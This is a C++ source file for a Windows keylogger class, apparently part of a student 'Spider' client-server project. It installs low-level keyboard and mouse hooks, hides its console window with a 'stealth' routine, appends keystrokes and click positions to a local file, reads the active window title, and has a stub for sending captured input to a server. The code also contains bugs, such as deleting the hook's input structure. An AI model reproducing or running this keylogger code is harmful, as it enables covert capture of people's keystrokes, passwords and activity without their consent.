//
// Keylog.cpp for Spider client in C:\Users\vezia_l\Documents\Epitech\cpp_spider\client\inc
// 
// Made by Louis VEZIA
// Login   <vezia_l@epitech.eu>
// 
// Started on  Tue Nov  1 13:50:30 2016 Louis VEZIA
// Last update Tue Nov  1 13:50:48 2016 Louis VEZIA
//

#include "Keylog.hh"

//static HHOOK hkb;

Keylog::Keylog()
{
}

Keylog::~Keylog()
{
}

const int		&Keylog::getKey() const
{
	return (keyPressed);
}

const COORD	&Keylog::getMouse() const
{
	return (mousePos);
}

const int		Keylog::getForeground()
{
	fg = GetForegroundWindow();

	return (0);
}

void	Keylog::setKey(const int &key)
{
	this->keyPressed = key;
}

void	Keylog::setMouse(const int &x, const int &y)
{
	COORD	pos;
	pos.X = x;
	pos.Y = y;
	mousePos = pos;
}

const int		Keylog::stealth()
{
	HWND Stealth;
	AllocConsole();
	Stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(Stealth, 0);
	return (0);
}

const bool	Keylog::peekMsg()
{
	return (PeekMessage(&msg, NULL, 0, 0, PM_NOREMOVE) != 0);
}

LRESULT CALLBACK Keylog::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	char	ch;
	std::ofstream file_db("database.txt", std::ofstream::out | std::ofstream::app);

	if (nCode < 0)
		return CallNextHookEx(NULL, nCode, wParam, lParam);

	ch = 0;

	tagKBDLLHOOKSTRUCT *str = (tagKBDLLHOOKSTRUCT *)lParam;

		switch (str->flags)
		{
			case (LLKHF_ALTDOWN):
				delete str;
				return 1;
		}

		ch = (char)str->vkCode;
		if (wParam == WM_KEYDOWN)
		{
			switch (str->vkCode)
			{
				case VK_MENU:
					std::cout << "SPECIAL PRESS" << std::endl;
					delete str;
					return 1;
			}
			std::cout << "VK_Code : " << str->vkCode << std::endl;
			std::cout << "Char Ascii : " << ch << std::endl;
			std::cout << std::endl;

			if (str->vkCode == VK_RETURN)
			{
				net.write("");
				// Send to server msg
			}
			else if (str->vkCode == VK_SPACE || (ch >= 0 && ch <= 127))
			{
				file_db << ch << std::endl;
			}
		}
	return CallNextHookEx(0, nCode, wParam, lParam);
}

LRESULT CALLBACK Keylog::LowLevelMouseProc(int code, WPARAM wParam, LPARAM lParam)
{
	std::ofstream	file_db("database.txt", std::ofstream::out | std::ofstream::app);
	POINT			p;
	std::string		msg;
	std::string		posx;
	std::string		posy;
	std::string		msg_buff;

	if (code == HC_ACTION)
	{

		msg = "";
		switch (wParam)
		{
		case WM_LBUTTONDOWN:
			msg = "WM_LBUTTONDOWN"; break;
		case WM_MOUSEMOVE:
			break;
		case WM_RBUTTONDOWN:
			msg = "WM_RBUTTONDOWN"; break;
		default:
			msg_buff = "Unknown msg: " + wParam;
			break;
		}
		if (msg != "")
		{
			std::cout << "< MouseClick pressed >" << std::endl;
			std::cout << msg << std::endl;
			file_db << msg;
			if (GetCursorPos(&p))
			{
				std::cout << "Pos X : " << p.x << std::endl;
				std::cout << "Pos Y : " << p.y << std::endl;
				std::cout << std::endl;
				file_db << "_posx:" << p.x << "_posy:" << p.y << std::endl;
			}
		}

	}
	file_db.close();
	return CallNextHookEx(0, code, wParam, lParam);
}

const std::string	Keylog::GetActiveWindowTitle()
{
	char wnd_title[256];

	HWND hwnd = GetForegroundWindow(); // get handle of currently active window
	GetWindowText(hwnd, wnd_title, sizeof(wnd_title));
	return (wnd_title);
}

bool Keylog::installhook()
{
	std::cout << "- in installhook" << std::endl;
	
	if (!(hkb = SetWindowsHookEx(WH_KEYBOARD_LL, &KeyboardProc, NULL, 0))) {
		std::cout << "Failed Install Hook" << std::endl;
		return (false);
	}
	if (!(hm = SetWindowsHookEx(WH_MOUSE_LL, &LowLevelMouseProc, NULL, 0))) {
		std::cout << "Failed Install Hook" << std::endl;
		return (false);
	}
	return true;
}